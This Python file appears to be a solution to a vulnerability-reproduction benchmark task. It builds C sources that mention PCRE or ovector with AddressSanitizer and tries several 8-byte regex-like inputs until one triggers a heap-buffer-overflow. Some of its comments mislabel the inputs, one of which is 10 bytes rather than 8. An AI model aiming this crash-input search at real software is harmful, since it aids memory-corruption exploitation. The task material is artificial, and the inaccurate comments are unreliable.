import tarfile
import tempfile
import subprocess
import os
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the source root (assuming single top-level directory)
            extracted_items = os.listdir(tmpdir)
            if len(extracted_items) == 1 and os.path.isdir(os.path.join(tmpdir, extracted_items[0])):
                source_root = os.path.join(tmpdir, extracted_items[0])
            else:
                source_root = tmpdir
            
            # Look for vulnerable program - common patterns
            binary_candidates = []
            for root, dirs, files in os.walk(source_root):
                for file in files:
                    if file.endswith('.c') or file.endswith('.cpp'):
                        # Look for regex/ovector related code
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if 'ovector' in content.lower() or 'pcre' in content.lower():
                                    # Build this file
                                    binary_name = 'vulnerable_test'
                                    # Try to compile with gcc
                                    compile_cmd = ['gcc', '-fsanitize=address', '-g', 
                                                  '-o', binary_name, filepath]
                                    try:
                                        result = subprocess.run(compile_cmd, 
                                                              cwd=root, 
                                                              capture_output=True,
                                                              timeout=10)
                                        if result.returncode == 0:
                                            binary_path = os.path.join(root, binary_name)
                                            if os.path.exists(binary_path):
                                                binary_candidates.append(binary_path)
                                    except:
                                        pass
                        except:
                            continue
            
            # If we found a binary, test patterns
            for binary_path in binary_candidates:
                # Try different 8-byte patterns based on regex/ovector vulnerability
                patterns = [
                    # Common patterns for regex ovector overflow
                    b'(())\x00\x00\x00\x00',  # 1 group + nulls
                    b'((()))()',  # 3 groups
                    b'()()()()',  # 4 empty groups
                    b'((((()))))',  # 5 nested groups (8 bytes: ASCII only)
                    b'\x28\x29\x28\x29\x00\x00\x00\x00',  # ()() with nulls
                    b'\x28\x00\x29\x00\x28\x00\x29\x00',  # (.)(.) with null bytes
                ]
                
                for pattern in patterns:
                    if len(pattern) != 8:
                        continue
                        
                    try:
                        # Run with pattern as input
                        result = subprocess.run([binary_path], 
                                              input=pattern,
                                              capture_output=True,
                                              timeout=2)
                        
                        # Check if crashed (non-zero exit or signal)
                        if result.returncode != 0:
                            # Verify it's ASAN error
                            if b'AddressSanitizer' in result.stderr or b'heap-buffer-overflow' in result.stderr:
                                return pattern
                    except subprocess.TimeoutExpired:
                        continue
                    except:
                        continue
            
            # Default fallback - 8 bytes that commonly trigger buffer overflows
            return b'\x41' * 8